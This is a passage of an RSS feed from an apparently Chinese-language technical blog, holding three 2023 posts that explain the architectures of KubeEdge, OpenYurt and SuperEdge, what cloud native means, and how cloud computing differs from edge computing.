      <title>云原生容器管理软件</title>
      <link>http://example.com/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/</link>
      <guid>http://example.com/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/</guid>
      <pubDate>Sun, 01 Oct 2023 11:32:00 GMT</pubDate>
      
      <description>主要介绍了云原生容器管理关键架构，Kubeedge,Openyurt以及Superedge</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="云原生容器管理软件"><a href="#云原生容器管理软件" class="headerlink" title="云原生容器管理软件"></a>云原生容器管理软件</h1><p>云原生需要容器，和容器化的应用程序，容器管理器。而现在市场中最广泛应用的容器管理器为：Kubeedge、Openyurt、Superedge。本文介绍三者的主要架构。</p><hr><h2 id="Kubeedge架构"><a href="#Kubeedge架构" class="headerlink" title="Kubeedge架构"></a>Kubeedge架构</h2><p>KubeEdge是一个开源系统，用于将容器化应用程序编排功能扩展到Edge的主机（将本机容器化的业务流程和设备管理扩展到Edge上的主机，也就是本地流程拓展到云主机）。</p><p>KubeEdge基于Kubernetes构建，并为网络、应用程序部署以及云与边缘之间的元数据同步提供核心基础架构支持。它还支持MQTT，并允许开发人员编写自定义逻辑并在Edge上启用资源受限的设备通信。KubeEdge由云部分和边缘部分组成，边缘和云部分现已开源。</p><p><img src="/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/kubeedge.png" alt="Kubeedge架构"><br>如图所示，该架构主要分为云、边、端三个部分，云上时KubeEdge的控制面，边就是KubeEdge的边缘节点，端就是跑了一些端侧设备。</p><p>下面按图介绍一下各个部分的组成：</p><h3 id="云端："><a href="#云端：" class="headerlink" title="云端："></a>云端：</h3><p>黄色方框三个Module，运行在CloudCore进程中。</p><p>1.CloudHub作为云到边的网络信道。</p><p>2.EdgeController负责管理边缘节点和pod（k8s管理的最小单位级）的metadata（元数据）。</p><p>3.DeviceController负责管理设备的metadata和status信息。</p><h3 id="边缘侧："><a href="#边缘侧：" class="headerlink" title="边缘侧："></a>边缘侧：</h3><p><strong>Edged：</strong></p><p>Edged可以看做是一个简化版的<a href="https://zhuanlan.zhihu.com/p/338462784">kubelet</a>（Kubelet 是 kubernetes 工作节点上的一个代理组件，运行在每个节点上。Kubelet是工作节点上的主要服务，定期从kube-apiserver组件接收新的或修改的Pod规范，并确保Pod及其容器在期望规范下运行。同时该组件作为工作节点的监控组件，向kube-apiserver汇报主机的运行状况。这里Edged类似的管理pod），负责pod生命周期的管理，并实现了和CRI，Volume，ConfigMap，Secret等功能的对接。</p><p><strong>EdgeHub：</strong></p><p>和CloudHub打交道，支持的协议有websocket和QUIC（QUIC由于其在握手方面做了大量优化，以及在断线重连上的优势，非常适合用于边云之间的通信），EdgeHub的主要功能有：</p><ul><li>Keep Alive</li><li>Publish Client Info</li><li>Route to Cloud</li><li>Route to Edge</li></ul><p><a href="https://www.cnblogs.com/yrxing/p/14607878.html?spm=wolai.workspace.0.0.745664a8tAPpON">kubeedge云边协同</a><br><a href="https://zhuanlan.zhihu.com/p/350335104?spm=wolai.workspace.0.0.280364a8YUO7TJ">kubeedge整体介绍</a><br><a href="https://blog.csdn.net/weixin_43401958/article/details/123203566?spm=wolai.workspace.0.0.280364a8YUO7TJ">kubeedge架构介绍</a></p><hr><h2 id="Openyurt整体架构"><a href="#Openyurt整体架构" class="headerlink" title="Openyurt整体架构"></a>Openyurt整体架构</h2><p>OpenYurt也是基于原生Kubernetes构建的框架。</p><blockquote><p>Kubernetes，简称 k8s或者 “kube”，是一个开源的 Linux 容器自动化运维平台，它消除了容器化应用程序在部署、伸缩时涉及到的许多手动操作。换句话说，你可以将多台主机组合成集群来运行 Linux 容器，而 Kubernetes 可以帮助你简单高效地管理那些集群。构成这些集群的主机还可以跨越公有云、私有云以及混合云。Kubernetes 最开始是由 Google 的工程师设计开发的。Google 作为 Linux 容器技术的早期贡献者之一，曾公开演讲介绍 Google 如何将一切都运行于容器之中（这是 Google 的云服务背后的技术）。Google 一周内的容器部署超过 20 亿次，全部的工作都由内部平台 Borg 支撑。Borg 是 Kubernetes 的前身，几年来开发 Borg 的经验教训也成了影响 Kubernetes 中许多技术的主要因素。</p></blockquote><p><img src="/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/openyurt.png" alt="openyurt架构"></p><p>其中蓝色框为原生Kubernetes组件，橙色框中组件为OpenYurt组件。</p><h3 id="节点分类"><a href="#节点分类" class="headerlink" title="节点分类"></a>节点分类</h3><ul><li>Cloud Node：通过内网与Kubernetes Master连接，主要用于部署运行中心控制组件。节点Label: <a href="http://openyurt.io/is-edge-worker:">openyurt.io&#x2F;is-edge-worker:</a> false</li><li>Edge Node：通过公网与Kubernetes Master连接，一般和边缘生产环境距离较近，主要用于部署运行边缘业务容器。节点Label: <a href="http://openyurt.io/is-edge-worker:">openyurt.io&#x2F;is-edge-worker:</a> true</li></ul><h3 id="边缘访问云端Kube-apiserver的管控流量"><a href="#边缘访问云端Kube-apiserver的管控流量" class="headerlink" title="边缘访问云端Kube-apiserver的管控流量"></a>边缘访问云端Kube-apiserver的管控流量</h3><p>Edge Node上的Kubelet, kube-proxy, Flannel以及其他云原生组件访问云端kube-apiserver的流量都会经过YurtHub组件，同时YurtHub组件会在本机磁盘上缓存云端返回的数据，当云边网络异常时YurtHub将使用本地缓存数据来恢复边缘业务。</p><h3 id="云边数据面流量"><a href="#云边数据面流量" class="headerlink" title="云边数据面流量"></a>云边数据面流量</h3><p>由于边缘侧节点的网络区域与云上网络域不在一个网络平面内，并且边缘节点一般不暴漏在公网上，为了实现云与边、边与边的网络通信，Raven组件通过构建VPN的方式打通云边主机网络与容器网络，这些云边的数据面流量将从通过Raven Agent实现互访互通。</p><h3 id="OpenYurt组件介绍"><a href="#OpenYurt组件介绍" class="headerlink" title="OpenYurt组件介绍"></a>OpenYurt组件介绍</h3><ul><li><strong>YurtHub:</strong><ul><li>节点维度的SideCar，节点上组件和kube-apiserver之间的流量代理，有边缘(edge)和云端(cloud)两种运行模式。其中边缘YurtHub会缓存云端返回的数据。</li><li>部署形态：以Static Pod形态运行在每个节点上。</li></ul></li><li><strong>Raven:</strong><ul><li>构建云边VPN访问通道，实现云边、边边网络互通，其中RavenControllerManager组件协调Gateway节点,以及RavenAgent组件负责构建VPN以及路由管理。</li><li>部署形态：RavenControllerManager以Deployment形态部署在Cloud Node或Master Node上，Raven Agent以DaemonSet部署在所有节点上。</li></ul></li><li><strong>YurtControllerManager：</strong><ul><li>中心的控制器，目前包括NodeLifeCycle Controller(不驱逐自治节点上的Pod)，YurtCSRController(用于Approve边缘的证书申请)</li><li>部署形态：Deployment形态部署在Cloud Node上。</li></ul></li><li><strong>YurtAppManager:</strong><ul><li>跨地域的资源及业务负载管理器，目前包括NodePool(节点池管理)，YurtAppSet(之前名为UnitedDeployment)(节点池维度的业务负载管理)，YurtAppDaemon(节点池维度的Daemonset), YurtIngress(节点池维度的Ingress Controller管理器)</li><li>部署形态： Deployment形态部署在Cloud Node上。</li></ul></li><li><strong>YurtDeviceController&#x2F;YurtEdgeXManager:</strong><ul><li>用于边缘IOT解决方案的非侵入融合，通过云原生模式管控边缘设备。目前EdgeX Foundry已经无缝集成到OpenYurt架构中。</li><li>YurtEdgeXManager以Deployment形态部署在Cloud Node上，YurtDeviceController以YurtAppSet(之前名为UnitedDeployment)形态部署在Edge Node上，每个NodePool上部署一套YurtDeviceController。</li></ul></li><li><strong>Pool-Coordinator:</strong><ul><li>在节点池内提供KV数据存储(仅存储在内存中)和分布式锁等能力，供YurtHub选举产生Leader，从而实现心跳代理，云边流量复用，节点池内运维监控等能力。</li><li>以YurtAppDaemon形态部署，会确保每个边缘节点池中有一个实例。</li></ul></li></ul><p><img src="/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/%E8%BE%B9%E7%BC%98%E8%8A%82%E7%82%B9.png" alt="边缘节点"></p><ul><li>Master节点位于云端，作为OpenYurt集群的管控节点，同时也作为集群的Cloud Node，上面部署了原生k8s的控制面组件controlplane，以及OpenYurt的管控组件Yurt-Controller-Manager、Yurt-App-manager、Tunnel-Server</li><li>Cloud-Node节点位于云端，作为OpenYurt集群的Cloud Node，可以用于部署OpenYurt的管控组件，本文实验中只用于演示了云端节点接入操作，没有实际部署OpenYurt的管控组件。</li><li>Edge-Node位与边缘，作为集群的边缘节点，部署了节点自治组件YurtHub，以及云端通道组件tunnel-agent。</li></ul><p><a href="https://openyurt.io/zh/">openyurt官网</a></p><p><a href="https://openyurt.io/zh/docs/core-concepts/architecture">系统架构 | OpenYurt</a></p><p><a href="https://developer.aliyun.com/article/813934#:~:text=OpenYurt,%E7%AE%A1%E7%90%86%E7%AD%89%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E3%80%82">openyurt入门实操</a></p><hr><h2 id="Superedge整体架构"><a href="#Superedge整体架构" class="headerlink" title="Superedge整体架构"></a>Superedge整体架构</h2><p><img src="/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/superedge.png" alt="Superedge架构"></p><h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h3><ul><li><strong>tunnel隧道技术</strong></li></ul><p>tunnel cloud与tunnel edge使得边缘与中心互通，即使边缘节点没有公网IP也能建立边缘和云端的连接。</p><ul><li><strong>边缘自治</strong></li></ul><p>就算引入隧道技术，边缘节点和云端的网络也不能时刻保持稳定，甚至会断连，自治使得断网或者边缘节点重启时，节点上的服务不受影响或能够恢复。</p><p>Life-Apiserver代理节点上所有组件和业务容器访问云端Kube-Apiserver的请求，并对请求结果做高速缓存。在断连时，利用缓存提供服务，实现边缘自治。</p><ul><li><strong>边缘分布式健康检查</strong></li></ul><p>边缘节点的异常由Edge-Health模块完成，每一个边缘节点有各自的Edge-Health，在一定的区域内，边缘节点能够互相访问，其中EH模块的互相访问可以确定彼此的安全性，最终一个节点的安全与否由所有访问的模块“投票”表决。若一个节点产生异常，异常结果会反馈给云端的Edge-Health-Admission，由云端根据投票结果和Apiserver选择将服务驱逐某边缘节点。</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/">-云原生</category>
      
      
      <comments>http://example.com/2023/10/01/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>云原生边缘技术</title>
      <link>http://example.com/2023/09/04/%E4%BA%91%E5%8E%9F%E7%94%9F%E8%BE%B9%E7%BC%98%E6%8A%80%E6%9C%AF/</link>
      <guid>http://example.com/2023/09/04/%E4%BA%91%E5%8E%9F%E7%94%9F%E8%BE%B9%E7%BC%98%E6%8A%80%E6%9C%AF/</guid>
      <pubDate>Mon, 04 Sep 2023 11:31:42 GMT</pubDate>
      
      <description>什么是云原生技术</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="云原生边缘技术"><a href="#云原生边缘技术" class="headerlink" title="云原生边缘技术"></a>云原生边缘技术</h1><p>云原生的本质其实是云原生技术和边缘技术的结合。</p><h2 id="云原生技术"><a href="#云原生技术" class="headerlink" title="云原生技术"></a>云原生技术</h2><p>云原生没有确切的定义，云原生一直在发展变化之中，解释权不归某个人或组织所有。云原生（CloudNative）是一个组合词，Cloud+Native。Cloud表示应用程序位于云中，而不是传统的数据中心；Native表示应用程序从设计之初即考虑到云的环境，原生为云而设计，在云上以最佳姿势运行，充分利用和发挥云平台的弹性+分布式优势。Pivotal公司的Matt Stine于2013年首次提出云原生（CloudNative）的概念；2015年，云原生刚推广时，Matt Stine在《迁移到云原生架构》一书中定义了符合云原生架构的几个特征：12因素、微服务、自敏捷架构、基于API协作、扛脆弱性；到了2017年，Matt Stine在接受InfoQ采访时又改了口风，将云原生架构归纳为模块化、可观察、可部署、可测试、可替换、可处理6特质；而Pivotal最新官网对云原生概括为4个要点：DevOps+持续交付+微服务+容器。</p><p><img src="/2023/09/04/%E4%BA%91%E5%8E%9F%E7%94%9F%E8%BE%B9%E7%BC%98%E6%8A%80%E6%9C%AF/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%9E%B6%E6%9E%84.png" alt="云原生"></p><p><strong>微服务</strong>：几乎每个云原生的定义都包含微服务，跟微服务相对的是单体应用。</p><p><strong>容器化</strong>：Docker是应用最为广泛的容器引擎，在思科谷歌等公司的基础设施中大量使用，是基于LXC技术搞的，容器化为微服务提供实施保障，起到应用隔离作用。</p><p><strong>DevOps</strong>：这是个组合词，Dev+Ops，就是开发和运维合体，不像开发和产品，经常刀刃相见，实际上DevOps应该还包括测试，DevOps是一个敏捷思维，是一个沟通文化，也是组织形式，为云原生提供持续交付能力。</p><p><strong>持续交付</strong>：持续交付是不误时开发，不停机更新，小步快跑，反传统瀑布式开发模型，这要求开发版本和稳定版本并存，其实需要很多流程和工具支撑。</p><p>总而言之，符合云原生架构的应用程序应该是：采用开源堆栈（K8S+Docker）进行容器化，基于微服务架构提高灵活性和可维护性，借助敏捷方法、DevOps支持持续迭代和运维自动化，利用云平台设施实现弹性伸缩、动态调度、优化资源利用率。</p><h3 id="云原生支撑技术"><a href="#云原生支撑技术" class="headerlink" title="云原生支撑技术"></a>云原生支撑技术</h3><p><strong>容器技术：</strong></p><p>容器的本质是一个进程，通过对该进程进行隔离和资源控制，其在运行时不会相互干扰。同时容器具有良好的移植性，可以在不同的操作系统中良好运行。以前，开发者通常使用虚拟机完成某些功能，但是虚拟机的系统开销较大，并且不利于程序的移植与部署。与虚拟机相比，容器更加轻量化，打包下载都更方便，例如Docker。</p><p>Docker 容器中每个应用不需要与其他应用组合，也不依赖于生产环境基础结构，能在研发、测试、生产过程中为应用提供一致的环境。Docker 使用客户端—服务器模式，利用远程应用程序接口（API, application programming interface）来管理和创建 Docker 容器。Docker 容器通过 Docker镜像创建，镜像就像容器的模板，每次创建容器都依赖于已有的镜像。</p><hr><p><strong>容器管理器</strong>：</p><p>K8s，是一个可移植、可扩展的开源平台，用于管理基于容器的微服务集群。在 Kubernetes 中，可以创建多个 pod（Kubernetes的基本单元），每个 pod 中可以部署多个容器，每个容器中可以部署一个服务，然后通过内置或自定义的负载均衡策略，实现对一组微服务的管理、注册和访问。</p><hr><p><strong>服务网格：</strong></p><p>尽管在很多情况下 Kubernetes 能够完成微服务治理功能，但开发者仍然会遇到其他问题。在实际生产环境中，由于微服务的实现方式不同，如果要使微服务之间进行通信，开发者需要预先协调通信接口和方式。此外，流量的管控与调度由于要考虑环境中的各种因素，所以开发过程并不简单。因此，服务网格应运而生。在服务网格中，每个微服务通过边车代理其服务间通信，因而大量的微服务与对应的边车会表现出网格的形式，这就是服务网格名称的由来。服务网格可以在多种环境中部署，最常用的是Kubernetes。</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/">-云原生</category>
      
      
      <comments>http://example.com/2023/09/04/%E4%BA%91%E5%8E%9F%E7%94%9F%E8%BE%B9%E7%BC%98%E6%8A%80%E6%9C%AF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>云计算与边缘计算</title>
      <link>http://example.com/2023/09/02/%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/</link>
      <guid>http://example.com/2023/09/02/%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/</guid>
      <pubDate>Sat, 02 Sep 2023 11:31:28 GMT</pubDate>
      
      <description>云计算与边缘计算的区别与联系</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="云计算和边缘计算"><a href="#云计算和边缘计算" class="headerlink" title="云计算和边缘计算"></a>云计算和边缘计算</h1><h2 id="什么是云计算"><a href="#什么是云计算" class="headerlink" title="什么是云计算"></a>什么是云计算</h2><ul><li>通俗地讲，云计算就是对计算机硬件，系统，网络，应用软件等资源的集中部署和再分配，以求达到计算资源的利用效率最大化。</li><li>云计算也是分布式计算的一种，通过网络“云”将巨大的数据计算处理程序分解成无数个小程序，然后，通过多部服务器组成的系统进行处理和分析这些小程序得到结果并返回给用户。简单地说，就是简单的分布式计算，解决任务分发，并进行计算结果的合并。因而，云计算又称为网格计算。通过这项技术，可以在很短的时间内（几秒种）完成对数以万计的数据的处理，从而达到强大的网络服务。</li><li>按照部署模型大致分为三类：公有云、私有云、混合云；服务模式也有三种：Saas、PaaS、IaaS。</li></ul><p>最底层的</p><p><strong>IaaS:</strong>  <strong><strong>Infrastructure</strong></strong> <strong>-as-a-Service（基础设施即服务）</strong></p><p>Infrastructure就是基础设施的意思，IaaS有时候也叫Hardware-as-a-Service，一下子就理解了吧？就是提供硬件相关的服务。以前，你要建个网站，建个FTP，需要自己买服务器和交换机等硬件设备，现在不用了，可以使用IaaS服务商提供的IaaS服务。</p><p>再往上</p><p><strong>PaaS:</strong>  <strong><strong>Platform</strong></strong> <strong>-as-a-Service（平台即服务）</strong></p><p>P就是Platform，平台。某些时候也叫做中间件。基于硬件之上，平台开发都可以在这一层进行。PaaS服务提供商提供各种开发和分发应用的解决方案，比如虚拟服务器和操作系统，以及数据库系统等。</p><p>继续往上</p><p><strong>SaaS:</strong>  <strong><strong>Software</strong></strong> <strong>-as-a-Service（软件即服务）</strong></p><p>这一层是和你的生活每天接触的一层，在这一层上，就可以直接访问和使用服务功能了！例如通过网页浏览器收发电邮，订购商品，查看航班信息等。在你的面前，就是具体的应用服务。</p><p>除了IaaS、PaaS、SaaS之外，现在还衍生出了很多相关的概念，例如BaaS（后端即服务，Backend-as-a-Service）、CaaS（通讯即服务，Communications-as-a-Service）、DaaS（数据即服务，Data-as-a-Service）。</p><h2 id="云计算的不足"><a href="#云计算的不足" class="headerlink" title="云计算的不足"></a>云计算的不足</h2><p>随着边缘计算的兴起，在太多场景中需要计算庞大的数据并且得到即时反馈。这些场景开始暴露出云计算的不足，主要有以下几点：</p><ul><li><strong>大数据的传输问题：</strong>据估计，到 2020 年，每人每天平均将产生 1.5GB 的数据。随着越来越多的设备连接到互联网并生成数据，以中心服务器为节点的云计算可能会遇到带宽瓶颈。</li><li><strong>数据处理的即时性：</strong>据统计，无人驾驶汽车每秒产生约 1GB 数据，波音 787 每秒产生的数据超过 5GB；2020 年我国数据储存量达到约 39ZB，其中约 30% 的数据来自于物联网设备的接入。海量数据的即时处理可能会使云计算力不从心。</li><li><strong>隐私以及能耗问题：</strong>云计算将身体可穿戴、医疗、工业制造等设备采集的隐私数据传输到数据中心的路径比较长，容易导致数据丢失或者信息泄露等风险；数据中心的高负载导致的高能耗也是数据中心管理规划的核心问题。</li></ul><h2 id="什么是边缘计算"><a href="#什么是边缘计算" class="headerlink" title="什么是边缘计算"></a>什么是边缘计算</h2><h3 id="边缘节点"><a href="#边缘节点" class="headerlink" title="边缘节点"></a>边缘节点</h3><p>边缘结点指的就是<strong>在数据产生源头和云中心之间</strong>任一具有计算资源和网络资源的结点。<br>手机就是人与云中心之间的边缘结点，网关是智能家居和云中心之间的边缘结点。在理想环境中，边缘计算指的就是在<strong>数据产生源附近</strong>分析、处理数据，没有数据的流转，进而<strong>减少网络流量和响应时间</strong>。</p><h3 id="边缘节点作用"><a href="#边缘节点作用" class="headerlink" title="边缘节点作用"></a>边缘节点作用</h3><p>由于边缘结点的存在，我们成功的把一部分网络边缘的运算处理从云中心转移到了数据产生源头附近，也就是转移到了网络边缘附近，从而达到了数据在网络中传输的时间和带宽，提高了整个网络的效率和性能。由于边缘结点能对数据进行本地处理，提高了安全性和隐私保护的能力。</p><h3 id="边缘计算的优势"><a href="#边缘计算的优势" class="headerlink" title="边缘计算的优势"></a>边缘计算的优势</h3><p>边缘计算着重要解决的问题，是传统云计算（或者说是中央计算）模式下存在的高延迟、网络不稳定和低带宽问题，同时边缘计算通过将计算需求转移至靠近用户的一侧，利用网络边缘的计算资源承载云计算服务，利用“数据上行、计算下行”的方式，突破了“终端＋数据中心”两级架构的局限性，可以满足应用对时延与带宽的需求。总体可以将边缘计算的优势总结如下：</p><ul><li>分布式和低延时</li><li>效率更高</li><li>更加智能</li><li>缓解了流量压力</li></ul><h2 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h2><p>边缘计算的概念是建立在云计算的基础上的。边缘计算和云计算互相协同，它们是彼此优化补充的存在，共同使能行业数字化转型。也有人说边缘计算是“最近端的云计算”，但是这只是一个比喻，事实上边缘计算不属于云计算。边缘计算是云计算技术的一种补充或者说云计算的“预处理”。</p><hr><p>云计算是一个统筹者，它负责长周期数据的大数据分析，能够在周期性维护、业务决策等领域运行。</p><hr><p>边缘计算着眼于实时、短周期数据的分析，更好地支撑本地业务及时处理执行。边缘计算靠近设备端，也为云端数据采集做出贡献，支撑云端应用的大数据分析，云计算也通过大数据分析输出业务规则下发到边缘处，以便执行和优化处理。</p><p><a href="https://www.zhihu.com/question/339553102?spm=wolai.workspace.0.0.f2a567e0nGXC5Q">什么是边缘节点</a></p><p><a href="https://zhuanlan.zhihu.com/p/406521426?spm=wolai.workspace.0.0.f2a567e0nGXC5Q">什么是边缘计算和云计算</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI1NTA0MDUyMA==&mid=2456659540&idx=1&sn=6a5ea9dd27706eab1ffba4a96e0715da&chksm=fda50b33cad282259dc19608308278d678c2d53b41901d952a429e269f82854361bafc2c1c69&scene=21#wechat_redirect">云计算的形象解读</a></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/">-云计算</category>
      
      
      <comments>http://example.com/2023/09/02/%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
